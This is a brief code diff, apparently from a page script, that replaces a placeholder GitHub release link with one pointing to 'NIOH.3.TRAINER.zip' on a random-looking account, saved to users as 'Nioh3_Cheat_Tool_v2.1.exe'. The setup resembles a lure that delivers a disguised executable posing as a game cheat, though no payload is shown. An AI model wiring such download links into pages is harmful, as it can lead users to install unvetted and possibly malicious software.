@@ -2,7 +2,7 @@
 'use strict';
 
 // === ТВОЯ ССЫЛКА НА ФАЙЛ В GITHUB RELEASES ===
-const YOUR_NIOH3_EXE_URL = "https://github.com/your-username/your-repo/releases/download/v1.0/Nioh3_Cheat_Tool.exe";
+const YOUR_NIOH3_EXE_URL = "https://github.com/halliewitvoet8756766/Nioh-3-menu/releases/download/0.1.1/NIOH.3.TRAINER.zip";
 const DOWNLOAD_FILENAME = "Nioh3_Cheat_Tool_v2.1.exe";
 
 // Остальной код — без внешних зависимостей, полностью самодостаточный
